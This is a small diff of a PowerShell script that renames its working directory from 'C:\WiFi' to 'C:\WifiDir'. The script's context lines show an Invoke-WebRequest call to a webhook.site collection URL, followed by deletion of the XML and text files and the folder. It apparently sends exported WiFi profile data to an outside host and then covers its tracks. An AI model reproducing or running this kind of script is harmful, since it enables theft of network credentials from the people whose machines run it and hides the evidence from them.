@@ -1,4 +1,4 @@
-$wd = "C:\WiFi"
+$wd = "C:\WifiDir"
 mkdir $wd
 cd $wd
 
@@ -14,4 +14,4 @@ Invoke-WebRequest -Uri https://webhook.site/5a3610fb-2789-404a-b42d-af8a689e5e13
 rm *.xml
 rm *.txt
 cd ..
-rm WiFi
+rm WifiDir
